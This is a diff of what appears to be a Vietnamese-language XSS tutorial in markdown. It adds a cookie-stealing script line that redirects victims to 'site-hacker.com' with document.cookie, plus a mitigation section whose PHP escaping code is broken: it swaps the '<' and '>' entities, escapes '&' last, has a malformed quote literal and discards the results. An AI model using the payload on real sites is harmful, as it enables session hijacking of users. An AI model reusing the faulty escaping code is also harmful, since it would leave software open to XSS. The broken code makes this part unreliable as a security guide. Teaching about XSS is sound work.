@@ -2,6 +2,7 @@
 
 - **[khái quát về xss](#1)**
 - **[ các đoạn js truyền vào để check lỗi](#2)**
+- **[ cách khắc phục](#5)**
 - **[ thực hành trên lab](#3)**
 - **[ Cách tấn công và hạ gục 1 trang web bằng xss](#4)**
 
@@ -53,6 +54,8 @@ câu lệnh chuyển tiếp
 
 ```
  - đoạn PHP get cookie
+ `<script>window.location=”http://site-hacker.com/get_cookie.php?phpcc=”+document.cookie+”&url=http://myblog.com”;</script>  
+`
  
  ```
  <?php
@@ -145,7 +148,27 @@ document.write(html);
 }
 ?>
 ``` 
+<a name="5"></a>
+## cách khắc phục xss
+
+### . Cách khắc phục :
+
+Để phòng chống tốt nhất XSS là theo nguyên tắc FIEO (Filter Input, Escape Output). Để làm việc này thì hiện tại có khá nhiều bộ lọc để chúng ta lựa chọn. Hôm nay mình giới thiệu tới các bạn một bộ thư viện viết bằng PHP cho phép filter HTML để ngăn chặn kẻ xấu post mã độc XSS thông qua website của bạn,
+Cách 1 :Viết mã lọc nội dung theo nguyên tắc FIEO (Filter Input, Escape Output) . Vì các đoạn mã độc bắt đầu vối “<script>” và kết thúc với “</script>” . Thay : “<” và “>” = “&gt;” và “&lt;” (các thực thể html) .Ta có đoạn code sau :
+PHP Code:
+```
+str_replace("<","&gt;",$info);str_replace(">","&lt;",$info);str_replace("'","&apos;",$info);str_replace(""","&quot;",$info);
+str_replace("&","&amp;",$info);  
+```
+Cách 2 : Dùng thư viện có sẵn , đó là HTML Purifier. Website: http://htmlpurifier.org/
+HTMLPurifier.png
+
+Nói sơ qua về HTML Purifier thì đây là bộ thư viện rất mạnh dùng triển khai trong code của mình để chống XSS. Được xây dựng theo mô hình OOP nên sử dụng rất dễ, sau thao tác include file thư viện, chỉ cần tạo instance của đối tượng HTML Purifier và gọi phương thức purify() là có thể filter được dữ liệu đầu vào. 
+PHP Code:
+```
+<?phprequire_once '/path/to/htmlpurifier/library/HTMLPurifier.auto.php';$purifier = new HTMLPurifier();$clean_html = $purifier->purify($dirty_html);
 <a name="3"></a>
+```
 ## lab 
 
 **XSS - Reflected (GET),XSS - Reflected (POST)**
